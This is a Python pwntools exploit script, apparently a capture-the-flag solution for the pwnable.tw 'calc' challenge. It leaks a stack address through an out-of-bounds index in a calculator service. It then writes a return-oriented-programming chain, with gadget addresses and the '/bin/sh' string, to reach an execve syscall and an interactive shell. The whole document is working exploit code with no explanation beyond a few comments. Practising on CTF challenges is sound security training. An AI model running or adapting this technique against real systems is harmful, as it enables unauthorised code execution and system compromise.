from pwn import *
import ctypes

io = remote('chall.pwnable.tw', 10100)

# find stack address
io.recvuntil('=== Welcome to SECPROG calculator ===\n')
io.sendline('+364+1')
stack_leak = int(io.recvline())
stack_leak = ctypes.c_uint(stack_leak).value

# the binary does not accept unsigned integer. So, divide the address into two signed integers and add them together
sh_addr = stack_leak - 109
sh_addr_1 = sh_addr // 2
sh_addr_2 = sh_addr - sh_addr_1

# construct rop chain

'''
0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
(/bin/sh address)
junk
junk
junk
0x0808f612 : add eax, 0xb ; pop edi ; ret
junk
0x08080473 : cdq ; ret
0x08049a21 : int 0x80
0x6e69622f : "/bin"
0x0068732f : "/sh\0"
'''

io.sendline('+{0}+{1}'.format(378, 0x68732f))
io.recvline()
io.sendline('+{0}+{1}'.format(377, 0x6e69622f))
io.recvline()
io.sendline('+{0}+{1}'.format(376, 0x8049a21))
io.recvline()
io.sendline('+{0}+{1}'.format(375, 0x8080473))
io.recvline()
io.sendline('+{0}+{1}'.format(373, 0x808f612))
io.recvline()
io.sendline('+{0}+{1}'.format(369, sh_addr_1))
io.recvline()
io.sendline('+{0}+{1}'.format(370, sh_addr_2))
io.recvline()
io.sendline('+{0}+{1}'.format(368, 0x8049f13))
io.recvline()

io.interactive()
